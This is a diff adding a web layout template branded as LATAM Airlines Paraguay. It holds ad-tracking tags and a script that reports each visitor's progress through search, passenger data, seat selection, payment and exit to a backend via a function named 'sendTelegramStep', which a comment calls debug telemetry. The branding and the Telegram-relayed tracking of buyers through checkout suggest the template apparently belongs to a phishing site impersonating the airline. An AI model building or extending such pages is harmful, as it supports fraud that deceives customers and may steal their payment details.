@@ -1,0 +1,119 @@
+---
+import '../styles/global.css';
+
+interface Props {
+  title?: string;
+  description?: string;
+  bodyClass?: string;
+}
+
+const {
+  title = 'Cotiza Vuelos, Hoteles y Autos | LATAM en Paraguay',
+  description = 'Cotiza y compra vuelos, hoteles y autos con LATAM Airlines Paraguay.',
+  bodyClass = '',
+} = Astro.props;
+---
+
+<!doctype html>
+<html lang="es-PY">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content={description} />
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <title>{title}</title>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '950663504721055');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=950663504721055&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18343297036"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-18343297036');
+</script>
+  </head>
+  <body class={bodyClass}>
+    <slot />
+    <script>
+      const PAGE_MESSAGES = {
+        '/': 'Buscando vuelos',
+        '/reservar': 'Buscando vuelos',
+        '/buscar': 'Eligiendo vuelos',
+        '/ofertas-vuelos': 'Eligiendo vuelos',
+        '/resumen-viaje': 'Eligiendo vuelos',
+        '/pasajeros': 'Datos de pasajero',
+        '/datos-pasajero': 'Datos de pasajero',
+        '/tienda': 'Eligiendo vuelos',
+        '/pagos': 'Pagina de pago',
+        '/success': 'Compra exitosa',
+      };
+
+      function sendTelegramStep(event) {
+        if (!event) return;
+        try {
+          fetch('/api/debug-page', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ event }),
+            keepalive: true,
+          }).catch(() => {});
+        } catch {
+          /* Debug telemetry is best-effort. */
+        }
+      }
+
+      function seatsStep() {
+        try {
+          const selection = JSON.parse(sessionStorage.getItem('latam-checkout-selection') || '{}');
+          const trip = String(selection.trip || new URLSearchParams(window.location.search).get('trip') || 'roundtrip').toLowerCase();
+          if (trip === 'oneway' || trip === 'ow') return 'Escogiendo asientos ida';
+        } catch {
+          /* fall through */
+        }
+        return 'Escogiendo asientos ida y vuelta';
+      }
+
+      function pageStep(pathname) {
+        const clean = pathname.replace(/\/+$/, '') || '/';
+        if (clean === '/prueba-telegram') return '';
+        if (clean === '/seleccion-asientos') return seatsStep();
+        return PAGE_MESSAGES[clean] || '';
+      }
+
+      sendTelegramStep(pageStep(window.location.pathname));
+
+      let ignoreLeaveUntil = 0;
+      const markInternal = () => {
+        ignoreLeaveUntil = Date.now() + 5000;
+      };
+      document.addEventListener('click', markInternal, true);
+      document.addEventListener('submit', markInternal, true);
+
+      window.addEventListener('pagehide', () => {
+        if (Date.now() < ignoreLeaveUntil) return;
+        sendTelegramStep('Salio');
+      });
+
+      window.sendTelegramStep = sendTelegramStep;
+    </script>
+  </body>
+</html>
